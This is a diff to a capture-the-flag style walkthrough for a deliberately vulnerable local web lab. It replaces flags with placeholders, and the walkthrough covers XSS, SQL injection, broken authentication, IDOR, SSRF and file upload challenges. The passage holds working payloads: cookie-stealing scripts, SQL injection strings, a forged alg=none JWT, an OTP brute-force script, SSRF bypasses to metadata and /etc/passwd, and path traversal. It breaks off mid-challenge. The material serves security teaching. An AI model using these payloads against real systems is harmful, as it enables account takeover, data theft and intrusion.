@@ -2,6 +2,8 @@
 
 Full walkthroughs for all 235 challenges. **Try each one yourself first** – the hints on each module page are there to nudge you, not to hand you the answer.
 
+> **Flags are random per deployment.** Every challenge flag is generated when the app first boots and stored only in the local database (which is gitignored). The walkthroughs below show `PENTRIX{...}` as a placeholder wherever a flag appears: they teach you *how* to earn it, and your lab will award the real one when your exploit succeeds.
+
 Base URL for every payload below: `http://localhost:3000`
 
 ---
@@ -9,7 +11,7 @@ Base URL for every payload below: `http://localhost:3000`
 
 ## xss – Cross-Site Scripting
 
-**1. Reflected XSS** – `PENTRIX{xss_reflected}`
+**1. Reflected XSS** – `PENTRIX{...}`
 The search box reflects your query into the page with no escaping:
 ```
 GET /xss/search?q=<script>alert(1)</script>
@@ -20,7 +22,7 @@ GET /xss/collect?c=abc&v=reflected
 ```
 Why it works: untrusted input is concatenated straight into HTML. In the real world the attacker would mail this link to a victim.
 
-**2. Stored XSS** – `PENTRIX{xss_stored}`
+**2. Stored XSS** – `PENTRIX{...}`
 Post a comment containing a script; it is stored and rendered raw for every later visitor:
 ```
 POST /xss/guestbook
@@ -32,7 +34,7 @@ GET /xss/collect?c=abc&v=stored
 ```
 Why it works: the guestbook saves HTML verbatim and serves it back unsanitized. Stored XSS is worse than reflected because the victim only has to view the page.
 
-**3. DOM XSS** – `PENTRIX{xss_dom}`
+**3. DOM XSS** – `PENTRIX{...}`
 The `/xss/dom` demo page drops attacker-controlled data into the DOM with a dangerous sink (`innerHTML`). Feed it a payload, then:
 ```
 GET /xss/collect?c=abc&v=dom
@@ -41,37 +43,37 @@ Why it works: the injection happens entirely in the browser – the server never
 
 ---
 
-**4. Stored XSS in Profile Bio** – `PENTRIX{xss_stored-xss-profile}`
+**4. Stored XSS in Profile Bio** – `PENTRIX{...}`
 1. Open `/xss/profile`.
 2. Paste this as your bio and save:
    `<script>fetch('/xss/collect?c='+document.cookie+'&v=stored-xss-profile')</script>`
 3. Reload `/xss/profile`. Your browser fires the beacon to `/xss/collect` and the flag is awarded.
 Why it works: the bio is stored verbatim in the `xss_profiles` table and rendered raw on the profile page with no output encoding, so the script runs for every visitor.
 
-**5. XSS via Attribute Breakout** – `PENTRIX{xss_xss-attr-breakout}`
+**5. XSS via Attribute Breakout** – `PENTRIX{...}`
 1. Open `/xss/attr?n="><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout')</script>`
 2. The page renders `<input type="text" value=""><script>...</script>" readonly />` and the script executes, firing the beacon.
 Why it works: the nickname is interpolated raw inside `value="..."`, so `">` closes the attribute and the injected `<script>` tag runs.
 
-**6. XSS in a JavaScript String** – `PENTRIX{xss_xss-js-context}`
+**6. XSS in a JavaScript String** – `PENTRIX{...}`
 1. Open `/xss/jsctx?q=';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context');//` (URL-encoded).
 2. The page renders `var q = '';fetch('...');//';` and the fetch executes, firing the beacon.
 Why it works: input is reflected raw inside a single-quoted JS string; the leading `'` ends the string, the attacker's statement runs, and `//` comments out the trailing quote.
 
-**7. Stored XSS via SVG Upload** – `PENTRIX{xss_xss-svg-upload}`
+**7. Stored XSS via SVG Upload** – `PENTRIX{...}`
 1. Open `/xss/svg` and upload this SVG:
    `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload')</script></svg>`
 2. Open the uploaded file's link (e.g. `/xss/uploads/evil-<timestamp>.svg`) directly. The script runs and the beacon awards the flag.
 Why it works: the file is served back as `image/svg+xml`, and SVG is XML that may contain `<script>`; a direct visit executes it in the lab's origin.
 
-**8. XSS via Naive Markdown Links** – `PENTRIX{xss_xss-markdown}`
+**8. XSS via Naive Markdown Links** – `PENTRIX{...}`
 1. Open `/xss/markdown` and render:
    `[click](javascript:fetch&#40;'/xss/collect?c='+document.cookie+'&v=xss-markdown'&#41;)`
    (the `&#40;`/`&#41;` entities keep the renderer's `[^)]+` link regex from cutting the URL short; the browser decodes them in the `href`).
 2. The output contains `<a href="javascript:...">click</a>`. Click it: the script runs and the beacon awards the flag.
 Why it works: the naive renderer converts `[text](url)` to an anchor without validating the URL scheme, so `javascript:` URLs survive into a live link.
 
-**9. DOM Clobbering to Admin** – `PENTRIX{xss_xss-dom-clobber}`
+**9. DOM Clobbering to Admin** – `PENTRIX{...}`
 1. Open `/xss/clobber` and save this custom HTML:
    `<form id="settings"><input name="isAdmin" value="1">`
    (The sanitizer strips `<script>` blocks but allows `form`/`input`.)
@@ -79,12 +81,12 @@ Why it works: the naive renderer converts `[text](url)` to an anchor without val
 3. Open `/xss/clobber-admin` to claim the flag.
 Why it works: named DOM elements shadow `window` properties, so attacker markup creates the `window.settings` object the page script trusts, flipping the `isAdmin` check without any script tag.
 
-**10. DOM XSS via document.write** – `PENTRIX{xss_xss-hash-write}`
+**10. DOM XSS via document.write** – `PENTRIX{...}`
 1. Open `/xss/hashwrite#<script>fetch('/xss/collect?c='+document.cookie+'&v=xss-hash-write')</script>` (URL-encode the fragment).
 2. The page runs `document.write(location.hash.slice(1))`, the injected script executes, and the beacon awards the flag.
 Why it works: the fragment flows unsanitized into `document.write`, a sink distinct from the `innerHTML` lab; content written this way is parsed as HTML, so script tags execute.
 
-**11. XSS in a Template Literal** – `PENTRIX{xss_xss-backtick}`
+**11. XSS in a Template Literal** – `PENTRIX{...}`
 1. Open `/xss/backtick?m=${fetch('/xss/collect?c='+document.cookie+'&v=xss-backtick')}` (URL-encoded).
 2. The page renders `` var msg = `${fetch('...')}`; `` and the expression evaluates, firing the beacon.
 Why it works: input is reflected raw inside a backtick template literal, and `${...}` expressions inside template literals are evaluated as JavaScript.
@@ -92,7 +94,7 @@ Why it works: input is reflected raw inside a backtick template literal, and `${
 
 ## sqli – SQL Injection
 
-**1. Login bypass** – `PENTRIX{sqli_login-bypass}`
+**1. Login bypass** – `PENTRIX{...}`
 The login query interpolates your username into SQL. Break out of the string and make the WHERE clause always true:
 ```
 POST /sqli/login
@@ -100,14 +102,14 @@ username=admin' OR '1'='1&password=anything
 ```
 Why it works: the query becomes `... WHERE username='admin' OR '1'='1' ...`, which matches the admin row without a password.
 
-**2. UNION injection** – `PENTRIX{sqli_union}`
+**2. UNION injection** – `PENTRIX{...}`
 The product search concatenates `q` into the query. Append a UNION SELECT with matching column count:
 ```
 GET /sqli/products?q=' UNION SELECT id,username,password,secret FROM users--%20
 ```
 Why it works: UNION merges rows from another table into the result set, so the page renders usernames, password hashes, and secrets as "products".
 
-**3. Blind boolean injection** – `PENTRIX{sqli_blind}`
+**3. Blind boolean injection** – `PENTRIX{...}`
 `/sqli/product?id=` only answers "exists / not found", but you can ask it yes/no questions about the secret:
 ```
 GET /sqli/product?id=1 AND substr((SELECT secret FROM users WHERE username='admin'),1,1)='P'
@@ -119,7 +121,7 @@ secret=<the secret you extracted>
 ```
 Why it works: even a single bit of difference in the response is enough to exfiltrate data one boolean question at a time.
 
-**4. Error-based injection** – `PENTRIX{sqli_error}`
+**4. Error-based injection** – `PENTRIX{...}`
 Raw SQLite errors are printed to the page. Any malformed input proves the injection point:
 ```
 GET /sqli/detail?id='
@@ -128,7 +130,7 @@ Why it works: verbose database errors confirm your input reached the SQL parser 
 
 ---
 
-**5. ORDER BY Injection** – `PENTRIX{sqli_order-by}`
+**5. ORDER BY Injection** – `PENTRIX{...}`
 
 The `sort` parameter on `/sqli/sort` is interpolated straight into `ORDER BY`,
 and `ORDER BY` accepts full expressions, not just column names. Smuggle in a
@@ -148,7 +150,7 @@ against the users table runs successfully.
 Why it works: `ORDER BY` evaluates any expression per row, so a conditional
 expression turns the visible sort order into a boolean oracle.
 
-**6. Second-Order SQL Injection** – `PENTRIX{sqli_second-order}`
+**6. Second-Order SQL Injection** – `PENTRIX{...}`
 
 Registration (`POST /sqli/register`) stores your display name with a prepared
 statement, so the payload sleeps quietly. But `/sqli/profile` later interpolates
@@ -172,7 +174,7 @@ fires on read, not on write.
 Why it works: input that is safe at rest becomes SQL when it is concatenated
 into a later query; the trust boundary moved from the form to the database.
 
-**7. LIKE Wildcard Injection** – `PENTRIX{sqli_like-wildcard}`
+**7. LIKE Wildcard Injection** – `PENTRIX{...}`
 
 `/sqli/wildcard` drops your term into `LIKE '%q%'` without escaping the pattern
 characters `%` and `_`:
@@ -188,7 +190,7 @@ Why it works: `%` and `_` are wildcards inside `LIKE`, and the app never escapes
 them, so attacker-controlled wildcards widen the match to rows the search
 should not return.
 
-**8. LIMIT/OFFSET Injection** – `PENTRIX{sqli_limit-offset}`
+**8. LIMIT/OFFSET Injection** – `PENTRIX{...}`
 
 `/sqli/paged` shows 2 products, but `limit` is interpolated raw into the `LIMIT`
 clause, and `LIMIT` accepts more than a plain number:
@@ -205,7 +207,7 @@ dumps rows too, but earns nothing).
 Why it works: the numeric context was never validated, so SQL clause syntax
 (`-1`, `offset,count`) is accepted where only a page size was intended.
 
-**9. GROUP BY Injection** – `PENTRIX{sqli_groupby-having}`
+**9. GROUP BY Injection** – `PENTRIX{...}`
 
 `/sqli/stats` groups sales by the `by` parameter and prints the grouping key in
 the first column. `GROUP BY` accepts any expression, including a subquery:
@@ -221,7 +223,7 @@ in the Group column and triggers the flag.
 Why it works: the grouping expression is attacker-controlled and echoed back,
 so pointing it at the users table exfiltrates data through the group key.
 
-**10. UNION Filter Bypass** – `PENTRIX{sqli_union-filter-bypass}`
+**10. UNION Filter Bypass** – `PENTRIX{...}`
 
 `/sqli/shop` strips only the exact lowercase word `union` from your search. The
 filter is case-sensitive and comment-blind:
@@ -239,7 +241,7 @@ which is the filter "working".
 Why it works: blacklist filters that do not understand SQL case-insensitivity
 or comment syntax are trivially bypassed with equivalent spellings.
 
-**11. INSERT Injection** – `PENTRIX{sqli_insert-inject}`
+**11. INSERT Injection** – `PENTRIX{...}`
 
 The feedback form at `/sqli/feedback` interpolates your input into
 `INSERT INTO sqli_feedback(name, message) VALUES ('...', '...')`. Stacked
@@ -260,7 +262,7 @@ wall awards the flag.
 Why it works: breaking out of the VALUES list lets a scalar subquery supply a
 column value, turning an INSERT into a read primitive.
 
-**12. Error-based Injection (Runtime Errors)** – `PENTRIX{sqli_error-cast}`
+**12. Error-based Injection (Runtime Errors)** – `PENTRIX{...}`
 
 `/sqli/cast` leaks raw database errors like the syntax-error lab, but a plain
 stray quote earns nothing here. Trigger a *runtime* error instead:
@@ -288,11 +290,11 @@ separate, equally usable oracle.
 
 ## auth – Broken Authentication
 
-**1. No rate limiting** – `PENTRIX{auth_brute-force}`
+**1. No rate limiting** – `PENTRIX{...}`
 Log in wrongly 5 or more times in the same session, then log in correctly as alice (`alice123`). Nothing stops you from guessing forever.
 Why it works: no throttling, no lockout, no CAPTCHA. Weak passwords fall to simple scripting.
 
-**2. JWT `alg=none`** – `PENTRIX{auth_jwt-none}`
+**2. JWT `alg=none`** – `PENTRIX{...}`
 The `/auth/jwt-admin` verifier trusts tokens whose header says `{"alg":"none"}` without checking any signature. Mint your own:
 ```python
 import base64, json
@@ -304,7 +306,7 @@ GET /auth/jwt-admin  with header  Authorization: Bearer <token>
 ```
 Why it works: the code branches around signature verification for `alg=none` and then trusts the self-declared `role` claim.
 
-**3. Password reset forgery** – `PENTRIX{auth_reset}`
+**3. Password reset forgery** – `PENTRIX{...}`
 Reset tokens are just base64 of the username with no randomness and no server-side record. Forge one for admin:
 ```
 POST /auth/reset/confirm
@@ -315,7 +317,7 @@ Why it works: predictable, unguessable-looking tokens are still predictable. Res
 
 ---
 
-**4. Username Enumeration** – `PENTRIX{auth_user-enum}`
+**4. Username Enumeration** – `PENTRIX{...}`
 
 1. Open `GET /auth/enum-login`.
 2. Submit a bogus name:
@@ -334,7 +336,7 @@ Why it works: the login distinguishes "user not found" from "wrong password",
 so each probe leaks whether a username exists; the submit page awards the flag
 once a name confirmed through that oracle is submitted.
 
-**5. Unsigned Remember-Me Cookie** – `PENTRIX{auth_rememberme}`
+**5. Unsigned Remember-Me Cookie** – `PENTRIX{...}`
 
 1. Log in as bob with "remember me" ticked:
    `curl -c jar --data-urlencode "username=bob" --data-urlencode "password=bob123" --data-urlencode "remember=1" http://localhost:3000/auth/remember-login`
@@ -347,7 +349,7 @@ once a name confirmed through that oracle is submitted.
 Why it works: the remember-me token is just base64(username) with no
 signature or MAC, so anyone can mint a valid token for any user.
 
-**6. Brute-Forcing a 4-Digit OTP** – `PENTRIX{auth_otp-bruteforce}`
+**6. Brute-Forcing a 4-Digit OTP** – `PENTRIX{...}`
 
 1. `curl -c jar -b jar http://localhost:3000/auth/otp-reset` and copy the
    reset token from the page (the scenario hands you a valid token for admin).
@@ -361,7 +363,7 @@ signature or MAC, so anyone can mint a valid token for any user.
    for i in range(10000):
        r = s.post('http://localhost:3000/auth/otp-reset/verify',
                   data={'token': token, 'otp': '%04d' % i, 'newPassword': 'otpwned1'})
-       if 'PENTRIX{auth_otp-bruteforce}' in r.text:
+       if 'PENTRIX{...}' in r.text:
            print('found:', '%04d' % i); break
    ```
 3. The correct code resets admin's password and awards the flag; log in at
@@ -370,7 +372,7 @@ signature or MAC, so anyone can mint a valid token for any user.
 Why it works: a 4-digit code with no rate limiting, no lockout, and no expiry
 is enumerable in seconds, and the token alone was never meant to be secret.
 
-**7. SHA-256 Predictable Reset Token** – `PENTRIX{auth_reset-predictable}`
+**7. SHA-256 Predictable Reset Token** – `PENTRIX{...}`
 
 1. Read the recipe shown on `GET /auth/sha-reset`:
    `sha256(username + 'reset-salt')`.
@@ -383,7 +385,7 @@ is enumerable in seconds, and the token alone was never meant to be secret.
 Why it works: the token is a deterministic hash of public data, so anyone who
 knows the recipe can mint a valid token for any account.
 
-**8. Guessable Security Question** – `PENTRIX{auth_security-question}`
+**8. Guessable Security Question** – `PENTRIX{...}`
 
 1. Open `GET /auth/bio/alice`. The bio says her mother's maiden name is Smith.
 2. Reset her password with that answer:
@@ -393,7 +395,7 @@ knows the recipe can mint a valid token for any account.
 Why it works: the "secret" answer is public knowledge printed in the user's
 bio, so the security question is not authentication at all.
 
-**9. Password Change Without Current Password** – `PENTRIX{auth_change-pass-noverify}`
+**9. Password Change Without Current Password** – `PENTRIX{...}`
 
 1. Log in as anyone: `curl -c jar -b jar --data-urlencode "username=bob" --data-urlencode "password=bob123" http://localhost:3000/auth/login`
 2. Open `GET /auth/change-password` and note the form has no current-password field.
@@ -404,7 +406,7 @@ bio, so the security question is not authentication at all.
 Why it works: the endpoint trusts the session alone and never re-verifies
 identity with the current password, so any active session can take over.
 
-**10. Support Ticket Impersonation** – `PENTRIX{auth_support-impersonate}`
+**10. Support Ticket Impersonation** – `PENTRIX{...}`
 
 1. Open `GET /auth/support`. Tickets are sequential.
 2. Walk the range: `curl "http://localhost:3000/auth/support/login?ticket=1001"`
@@ -414,7 +416,7 @@ identity with the current password, so any active session can take over.
 Why it works: ticket ids are predictable and the support endpoint performs no
 authorization check, so anyone can impersonate any customer, including admin.
 
-**11. API Key Leaked in HTML Comment** – `PENTRIX{auth_apikey-leak}`
+**11. API Key Leaked in HTML Comment** – `PENTRIX{...}`
 
 1. Log in as anyone and open `GET /auth/settings` (keep the session cookie).
 2. View the page source: an HTML comment contains the admin API key, e.g.
@@ -431,19 +433,19 @@ left that key in an HTML comment readable via "view source".
 
 Log in as alice first: `GET /idor/login/alice` (password `alice123`).
 
-**1. Profile IDOR** – `PENTRIX{idor_profile}`
+**1. Profile IDOR** – `PENTRIX{...}`
 ```
 GET /idor/users/1
 ```
 You are user 2, but nothing stops you reading user 1 (admin).
 
-**2. Order IDOR** – `PENTRIX{idor_order}`
+**2. Order IDOR** – `PENTRIX{...}`
 ```
 GET /idor/orders/2
 ```
 Order 2 belongs to bob. The endpoint checks you are logged in, not that the order is yours.
 
-**3. Unprotected admin panel** – `PENTRIX{idor_admin}`
+**3. Unprotected admin panel** – `PENTRIX{...}`
 ```
 GET /idor/admin
 ```
@@ -452,7 +454,7 @@ Why all three work: the app confuses authentication (who you are) with authoriza
 
 ---
 
-**4. Invoice Download IDOR** – `PENTRIX{idor_idor-download}`
+**4. Invoice Download IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar http://localhost:3000/idor/invoice/2` (bob's invoice)
@@ -461,7 +463,7 @@ Why all three work: the app confuses authentication (who you are) with authoriza
 
 Why it works: the invoice is fetched by id with no ownership check.
 
-**5. Email Change IDOR** – `PENTRIX{idor_idor-email-change}`
+**5. Email Change IDOR** – `PENTRIX{...}`
 
 1. Log in as alice and open `GET /idor/account` to see the change-email form.
 2. Tamper the `user_id` field to target admin (id 1):
@@ -471,7 +473,7 @@ Why it works: the invoice is fetched by id with no ownership check.
 Why it works: the target account comes from a client-supplied `user_id`
 parameter that the server never validates against the logged-in user.
 
-**6. Shopping Cart IDOR** – `PENTRIX{idor_idor-cart}`
+**6. Shopping Cart IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar "http://localhost:3000/idor/cart?user_id=3"` (bob's cart)
@@ -481,7 +483,7 @@ parameter that the server never validates against the logged-in user.
 Why it works: the cart is looked up by a client-supplied `user_id` query
 parameter with no ownership check.
 
-**7. API Key Regeneration IDOR** – `PENTRIX{idor_idor-apikey-regen}`
+**7. API Key Regeneration IDOR** – `PENTRIX{...}`
 
 1. Log in as alice and open `GET /idor/apikey`.
 2. Regenerate admin's key (id 1) instead of your own:
@@ -494,7 +496,7 @@ parameter with no ownership check.
 Why it works: key regeneration trusts a client-supplied `user_id` with no
 ownership check, so you can rotate anyone's key and then use the new value.
 
-**8. Stored Address IDOR** – `PENTRIX{idor_idor-address}`
+**8. Stored Address IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar http://localhost:3000/idor/address/3` (admin's address)
@@ -503,7 +505,7 @@ ownership check, so you can rotate anyone's key and then use the new value.
 
 Why it works: the stored address is fetched by id with no ownership check.
 
-**9. Forced Browsing to Admin Function** – `PENTRIX{idor_function-browse}`
+**9. Forced Browsing to Admin Function** – `PENTRIX{...}`
 
 1. Log in as alice (or bob), a non-admin user.
 2. `curl -c jar -b jar http://localhost:3000/idor/admin/users`
@@ -513,7 +515,7 @@ Why it works: the stored address is fetched by id with no ownership check.
 Why it works: the endpoint only checks "logged in" and never the admin role,
 so any authenticated user can force-browse the admin function.
 
-**10. Comment Deletion IDOR** – `PENTRIX{idor_idor-comment-delete}`
+**10. Comment Deletion IDOR** – `PENTRIX{...}`
 
 1. Log in as bob and open `GET /idor/comments` to see comment ids.
 2. Delete a comment written by someone else (admin's is id 1):
@@ -523,7 +525,7 @@ so any authenticated user can force-browse the admin function.
 Why it works: deletion is keyed by comment id only; authorship is never
 checked.
 
-**11. Private Notes IDOR** – `PENTRIX{idor_idor-notes}`
+**11. Private Notes IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar http://localhost:3000/idor/notes/3` (admin's private
@@ -536,14 +538,14 @@ check.
 
 ## ssrf – Server-Side Request Forgery
 
-**1. Basic SSRF** – `PENTRIX{ssrf_basic}`
+**1. Basic SSRF** – `PENTRIX{...}`
 The fetcher requests any URL you give it, including internal ones:
 ```
 GET /ssrf/fetch?url=http://localhost:3000/ssrf/internal/secret
 ```
 Why it works: user input becomes the server's outbound request target, so you can make the server talk to itself.
 
-**2. Blocklist bypass** – `PENTRIX{ssrf_bypass}`
+**2. Blocklist bypass** – `PENTRIX{...}`
 `/ssrf/fetch2` blocks URLs containing the *strings* `127.0.0.1` or `localhost`. The same address has other spellings:
 ```
 GET /ssrf/fetch2?url=http://2130706433:3000/ssrf/internal/secret
@@ -553,7 +555,7 @@ Why it works: string blocklists are not address validation. Parse the URL, resol
 
 ---
 
-**3. Open-redirect SSRF** – `PENTRIX{ssrf_ssrf-redirect}`
+**3. Open-redirect SSRF** – `PENTRIX{...}`
 
 `/ssrf/fetch3` follows redirects (up to 5) but only inspects the *initial*
 URL's hostname against its blocklist (`127.0.0.1`). Bounce the fetch through
@@ -567,7 +569,7 @@ curl --get --data-urlencode \
 ```
 
 The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
-flag `PENTRIX{ssrf_ssrf-redirect}`. The page awards the flag only when at
+flag `PENTRIX{...}`. The page awards the flag only when at
 least one redirect was actually followed, so a direct fetch of the secret
 through `/ssrf/fetch3` shows the marker but earns no flag. Fetching
 `http://127.0.0.1:3000/...` directly still returns 403.
@@ -576,7 +578,7 @@ Why it works: the blocklist is checked against the first URL only and the
 redirect target is never re-validated, so the 302 response from `/ssrf/jump`
 smuggles the server-side request to the blocked host.
 
-**4. Userinfo bypass** – `PENTRIX{ssrf_ssrf-userinfo}`
+**4. Userinfo bypass** – `PENTRIX{...}`
 
 `/ssrf/userinfo` "allows" only URLs containing the string `pentrix.lab`.
 Smuggle the trusted string in as userinfo (everything before `@` is
@@ -590,13 +592,13 @@ curl --get --data-urlencode \
 
 The check sees `pentrix.lab` and passes, but the request really goes to
 `127.0.0.1:3000`, returning the secret marker and the flag
-`PENTRIX{ssrf_ssrf-userinfo}`.
+`PENTRIX{...}`.
 
 Why it works: the allowlist is a raw substring test instead of parsing the
 real hostname, so userinfo positioning tricks it while the URL parser routes
 to loopback.
 
-**5. Hex IP bypass** – `PENTRIX{ssrf_ssrf-hex-ip}`
+**5. Hex IP bypass** – `PENTRIX{...}`
 
 `/ssrf/hex-ip` blocks the literal strings `127.0.0.1` and `localhost` in the
 raw URL. Use hex octets, which the WHATWG URL parser normalizes to 127.0.0.1:
@@ -609,13 +611,13 @@ curl --get --data-urlencode \
 
 The string `0x7f.0.0.1` contains no blocked substring, yet the fetcher
 connects to loopback and returns the secret marker plus the flag
-`PENTRIX{ssrf_ssrf-hex-ip}`.
+`PENTRIX{...}`.
 
 Why it works: the blocklist compares raw strings while the URL parser
 normalizes alternate IP spellings, so the normalized request and the
 blocklisted string never match.
 
-**6. Octal IP bypass** – `PENTRIX{ssrf_ssrf-octal-ip}`
+**6. Octal IP bypass** – `PENTRIX{...}`
 
 Same naive blocklist on `/ssrf/octal-ip`. Leading zeros make the parser read
 octets as octal (`0177` = 127):
@@ -627,12 +629,12 @@ curl --get --data-urlencode \
 ```
 
 No blocked substring is present, the request lands on loopback, and the page
-returns the secret marker with the flag `PENTRIX{ssrf_ssrf-octal-ip}`.
+returns the secret marker with the flag `PENTRIX{...}`.
 
 Why it works: the blocklist only knows dotted decimal, but the URL parser
 interprets zero-padded parts as octal, resolving `0177.0.0.1` to 127.0.0.1.
 
-**7. 0.0.0.0 bypass** – `PENTRIX{ssrf_ssrf-zero-ip}`
+**7. 0.0.0.0 bypass** – `PENTRIX{...}`
 
 `/ssrf/zero-ip` never mentions `0.0.0.0` in its blocklist, and this fetcher
 treats it as "this host":
@@ -643,14 +645,14 @@ curl --get --data-urlencode \
   http://localhost:3000/ssrf/zero-ip
 ```
 
-The fetch succeeds against loopback and the flag `PENTRIX{ssrf_ssrf-zero-ip}`
+The fetch succeeds against loopback and the flag `PENTRIX{...}`
 is awarded.
 
 Why it works: `0.0.0.0` is a loopback-adjacent address the blocklist simply
 never considered, and the fetcher rewrites it to 127.0.0.1 the way several
 real HTTP stacks do.
 
-**8. Integer IP bypass** – `PENTRIX{ssrf_ssrf-single-int}`
+**8. Integer IP bypass** – `PENTRIX{...}`
 
 An IPv4 address is one 32-bit number; 127.0.0.1 = 2130706433. `/ssrf/single-int`
 has the same substring blocklist:
@@ -663,13 +665,13 @@ curl --get --data-urlencode \
 
 The decimal form contains no blocked string, resolves to loopback, and the
 response carries the secret marker with the flag
-`PENTRIX{ssrf_ssrf-single-int}`.
+`PENTRIX{...}`.
 
 Why it works: the URL parser accepts the single-integer IPv4 form and
 normalizes it to 127.0.0.1, while the blocklist only recognizes the dotted
 spelling.
 
-**9. Cloud metadata SSRF** – `PENTRIX{ssrf_ssrf-metadata}`
+**9. Cloud metadata SSRF** – `PENTRIX{...}`
 
 `/ssrf/fetch-meta` simulates a cloud instance metadata service at the
 link-local address 169.254.169.254, which nothing blocks:
@@ -682,13 +684,13 @@ curl --get --data-urlencode \
 
 The simulated metadata document (including fake IAM credentials whose secret
 access key embeds the marker `SSRF-INTERNAL-9921`) is returned and the flag
-`PENTRIX{ssrf_ssrf-metadata}` is awarded.
+`PENTRIX{...}` is awarded.
 
 Why it works: the fetcher does not restrict destination addresses, so the
 classic cloud metadata endpoint is reachable server-side and leaks instance
 credentials.
 
-**10. file:// scheme SSRF** – `PENTRIX{ssrf_ssrf-file}`
+**10. file:// scheme SSRF** – `PENTRIX{...}`
 
 `/ssrf/fetch-file` accepts the `file:` scheme and reads the path with the
 server's filesystem privileges:
@@ -699,7 +701,7 @@ curl --get --data-urlencode "url=file:///etc/passwd" \
 ```
 
 The page shows the contents of `/etc/passwd` (look for the `root:` line) and
-awards the flag `PENTRIX{ssrf_ssrf-file}`.
+awards the flag `PENTRIX{...}`.
 
 Why it works: allowing `file://` in a URL fetcher turns it into a local file
 reader running with the server's privileges.
@@ -709,14 +711,14 @@ reader running with the server's privileges.
 
 ## upload – Unrestricted File Upload
 
-**1. Stored XSS via upload** – `PENTRIX{upload_stored-xss}`
+**1. Stored XSS via upload** – `PENTRIX{...}`
 No content checks at all, and files are served inline, so an uploaded SVG executes in the browser:
 ```
 curl --data-binary @evil.svg "http://localhost:3000/upload?filename=evil.svg"
 ```
 Why it works: the server never asks *what* the file is, and serving HTML/SVG inline turns storage into script execution.
 
-**2. Blacklist bypass** – `PENTRIX{upload_blacklist-bypass}`
+**2. Blacklist bypass** – `PENTRIX{...}`
 v2 blocks only the *exact* lowercased extensions `.php`, `.exe`, `.sh`. Smuggle the dangerous extension inside a longer name:
 ```
 curl --data-binary @shell.php.jpg "http://localhost:3000/upload/blacklist?filename=shell.php.jpg"
@@ -725,7 +727,7 @@ Why it works: the check looks at the final extension only (`.jpg`), while the st
 
 ---
 
-**3. Double extension bypass** – `PENTRIX{upload_upload-double-ext}`
+**3. Double extension bypass** – `PENTRIX{...}`
 
 `/upload/ext-blacklist` blocks `.svg`/`.html`/`.htm` by exact, case-sensitive
 *final* extension only, while `/upload/view/:name` guesses the served content
@@ -737,7 +739,7 @@ printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
   | curl --data-binary @- "http://localhost:3000/upload/ext-blacklist?filename=shell.svg.jpg"
 ```
 
-The response contains the flag `PENTRIX{upload_upload-double-ext}`. Verify it
+The response contains the flag `PENTRIX{...}`. Verify it
 is served as active content:
 
 ```bash
@@ -749,7 +751,7 @@ Why it works: `path.extname("shell.svg.jpg")` is `.jpg`, so the blacklist
 misses it, but the viewer's substring check finds `.svg` and serves the file
 as SVG, so embedded scripts execute in a victim's browser.
 
-**4. Case-sensitive blacklist bypass** – `PENTRIX{upload_upload-case}`
+**4. Case-sensitive blacklist bypass** – `PENTRIX{...}`
 
 The same v3 blacklist compares the extension exactly as written, without
 lowercasing:
@@ -760,7 +762,7 @@ printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
 ```
 
 `evil.SVG` dodges the lowercase `.svg` entry and the flag
-`PENTRIX{upload_upload-case}` is awarded. Fetching
+`PENTRIX{...}` is awarded. Fetching
 `/upload/view/evil.SVG` shows it served as `image/svg+xml` with the payload
 intact.
 
@@ -768,7 +770,7 @@ Why it works: the blacklist does a case-sensitive string comparison, but the
 viewer lowercases before guessing the content type, so the uppercase variant
 is stored yet still served as active SVG.
 
-**5. Content-Type header spoofing** – `PENTRIX{upload_upload-ctype}`
+**5. Content-Type header spoofing** – `PENTRIX{...}`
 
 `/upload/mime-check` decides "is this an image" from the client-supplied
 `Content-Type` request header alone, never inspecting the bytes:
@@ -779,13 +781,13 @@ printf '<html><body><script>alert(1)</script></body></html>' \
     "http://localhost:3000/upload/mime-check?filename=evil.html"
 ```
 
-The HTML file is accepted and the flag `PENTRIX{upload_upload-ctype}` is
+The HTML file is accepted and the flag `PENTRIX{...}` is
 awarded. `/upload/view/evil.html` returns it as `text/html`.
 
 Why it works: the header is fully attacker-controlled, so lying about the
 content type sails past a check that never looks at the actual file bytes.
 
-**6. Path traversal on write** – `PENTRIX{upload_upload-traversal}`
+**6. Path traversal on write** – `PENTRIX{...}`
 
 `/upload/traverse` joins the raw filename to the uploads directory with no
 basename or containment check. Escape the directory with `../`:
@@ -796,7 +798,7 @@ printf 'TRAVERSAL-PROOF' \
 ```
 
 The file lands one level above the uploads dir and the flag
-`PENTRIX{upload_upload-traversal}` is awarded. Read it back through the same
+`PENTRIX{...}` is awarded. Read it back through the same
 missing check on the read path:
 
 ```bash
@@ -807,7 +809,7 @@ Why it works: `path.join` does not stop `../` segments from escaping the
 intended directory, so both the write and the read resolve outside the
 uploads folder.
 
-**7. SVG onload stored XSS** – `PENTRIX{upload_upload-svg-onload}`
+**7. SVG onload stored XSS** – `PENTRIX{...}`
 
 `/upload/svg-avatar` accepts `.svg` files and serves them inline without
 stripping event-handler attributes:
@@ -818,14 +820,14 @@ printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1
 ```
 
 The `onload` handler survives (the endpoint only checks for its presence) and
-the flag `PENTRIX{upload_upload-svg-onload}` is awarded. Opening
+the flag `PENTRIX{...}` is awarded. Opening
 `/uploads/xss.svg` directly serves it as `image/svg+xml` with the handler
 intact, so the script runs in the visitor's browser.
 
 Why it works: SVG is XML and allows event handlers on elements, the uploader
 never sanitizes them, and the file is served inline as active content.
 
-**8. Strip-once filter bypass** – `PENTRIX{upload_upload-strip-once}`
+**8. Strip-once filter bypass** – `PENTRIX{...}`
 
 `/upload/filter` removes each dangerous extension (`.svg`, `.html`, `.htm`)
 exactly once with a non-global `replace`. Nest the extension inside itself so
